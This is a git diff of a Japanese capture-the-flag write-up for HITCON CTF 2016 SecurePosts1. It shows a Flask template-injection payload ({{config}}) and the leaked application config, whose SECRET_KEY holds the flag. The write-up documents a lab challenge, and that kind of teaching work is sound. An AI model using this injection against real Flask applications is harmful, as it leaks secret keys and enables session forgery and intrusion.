@@ -68,7 +68,12 @@ flaskには、どうやらrender時にユーザー入力が来ていると困る
 {{config}}
 ```
 
-すると、以下のようにalertが表示されOKを押すと、Author部分に以下が入って返ってくる
+すると、以下のようにalertが表示される。
+
+<img src="https://github.com/Route9/ctf-writeup/raw/master/hitcon_ctf2016/SecurePosts1/get_alert.png" width="320px">
+
+あとは、OKを押すと、Author部分に以下のようにflagが入って返ってくる。
+
 ```
 <Config {'SESSION_COOKIE_SECURE': False, 'DEBUG': False, 'SESSION_COOKIE_NAME': 'session', 'JSONIFY_PRETTYPRINT_REGULAR': True, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'PREFERRED_URL_SCHEME': 'http', 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SERVER_NAME': None, 'SEND_FILE_MAX_AGE_DEFAULT': 43200, 'TRAP_HTTP_EXCEPTIONS': False, 'MAX_CONTENT_LENGTH': None, 'TRAP_BAD_REQUEST_ERRORS': False, 'JSON_AS_ASCII': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SESSION_COOKIE_DOMAIN': None, 'USE_X_SENDFILE': False, 'APPLICATION_ROOT': None, 'SESSION_COOKIE_HTTPONLY': True, 'LOGGER_NAME': 'post_manager', 'SESSION_COOKIE_PATH': None, 'SECRET_KEY': 'hitcon{>_<---Do-you-know-<script>alert(1)</script>-is-very-fun?}', 'JSON_SORT_KEYS': True}>
 ```
